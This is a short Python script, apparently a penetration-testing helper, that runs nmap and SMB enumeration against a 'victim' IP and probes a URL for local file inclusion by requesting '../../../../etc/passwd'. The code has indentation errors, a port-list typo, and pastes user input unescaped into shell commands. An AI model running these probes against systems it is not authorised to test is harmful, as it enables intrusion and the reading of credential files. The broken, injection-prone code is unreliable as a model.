#!/usr/bin/python3
import subprocess, os, os.path

class menu1meat:
	def nmap():	
		print("Running TCP nmap scan")
    	nmap_directory="./HS/nmap"
    	os.mkdir(nmap_directory)
		os.chdir(nmap_directory)
		vhost = input("Please enter the victim's IP address: ")
		os.system("nmap -sC -sV " + vhost + "| tee nmap.nmap")

	def SMBEnum():
		IP = input("Please enter the victim's IP address: ")
		print("Checking if SMB is vulnerable")
		SMB="./HS/n-smb"
		os.chdir("..") ; os.mkdir(SMB) ; os.chdir(SMB)
		os.system("nmap --script smb-vuln* -p 137,139.445 " + IP + "| tee smb.nmap")
		os.system("smbmap -H " + IP + "| tee smbmap.smbmap")
		os.system("smbclient -m SMB2 -L " + IP + "| tee smbclient.smbclient")

	def apacheVUL():
    	print("Checking for LFI Vulnerability")
		website=input("Please enter the website excluding the potential vulnerable page. (e.g) http://10.11.1.35/section.php?page= ")
		etcpw= "../../../../../../../../etc/passwd"
		os.system("curl " + website + etcpw)

